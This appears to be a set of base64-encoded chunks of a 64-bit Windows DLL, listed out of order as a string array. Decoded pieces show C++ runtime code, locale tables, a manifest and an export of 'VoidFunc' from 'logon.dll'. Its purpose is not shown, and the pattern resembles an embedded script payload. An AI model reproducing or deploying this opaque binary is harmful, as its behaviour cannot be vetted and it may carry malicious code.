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AAAAAAABhtAYABAAAAGAAAAAAAAACAJwGAAQAAABYAAAAAAAAAIG0BgAEAAAAXAAAAAAAAAChtAYABAAAAIgAAAAAAAAAwbQGAAQAAACMAAAAAAAAANG0BgAEAAAAkAAAAAAAAADhtAYABAAAAJQAAAAAAAAA8bQGAAQAAACYAAAAAAAAASG0BgAEAAACUJgAAAAAAAAAAAAAAAAAAIN0BgAEAAAAAAAAAAAAAACDdAYABAAAAAQEAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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','gB0AGkAbQBlACAARQByAHIAbwByACEACgAKAFAAcgBvAGcAcgBhAG0AOgAgAAAAAAAAADwAcAByAG8AZwByAGEAbQAgAG4AYQBtAGUAIAB1AG4AawBuAG8AdwBuAD4AAAAAAC4ALgAuAAAACgAKAAAAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAVgBpAHMAdQBhAGwAIABDACsAKwAgAFIAdQBuAHQAaQBtAGUAIABMAGkAYgByAGEAcgB5AAAAAAAAAAAAMDkBgAEAAABAOQGAAQAAAFA5AYABAAAAYDkBgAEAAABqAGEALQBKAFAAAAAAAAAAegBoAC0AQwBOAAAAAAAAAGsAbwAtAEsAUgAAAAAAAAB6AGgALQBUAFcAAAAAAAAAAQAAAAAAAADwVQGAAQAAAAIAAAAAAAAA+FUBgAEAAAADAAAAAAAAAABWAYABAAAABAAAAAAAAAAIVgGAAQAAAAUAAAAAAAAAGFYBgAEAAAAGAAAAAAAAACBWAYABAAAABwAAA','j0nMS4wJz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9J2FzSW52b2tlcicgdWlBY2Nlc3M9J2ZhbHNlJyAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAg','f//g30gAHU6SIud2AAAAIE7Y3Nt4HUrg3sYBHUli0MgLSAFkxmD+AJ3GEiLSyjo7DH//4XAdAuyAUiLy+jyYf//kOj8T///SIuN4AAAAEiJiPAAAADo6U///0iLTVBIiYj4AAAASIPEKF1bw8xAVUiD7CBIi+ozwDhFOA+VwEiDxCBdw8xAVUiD7CBIi+roaHD//5BIg8QgXcPMQFVIg+wgSIvq6JpP//+DuAABAAAAfgvojE////+IAAEAAEiDxCBdw8xAVUiD7CBIi+pIiw2DrQAASIPEIF1I/yU/DAAAzMzMzMzMzEBVSIPsIEiL6kiLATPJgTgFAADAD5TBi8FIg8QgXcPMQFVIg+wgSIvqg31gAHQIM8no/oX//5BIg8QgXcPMQ','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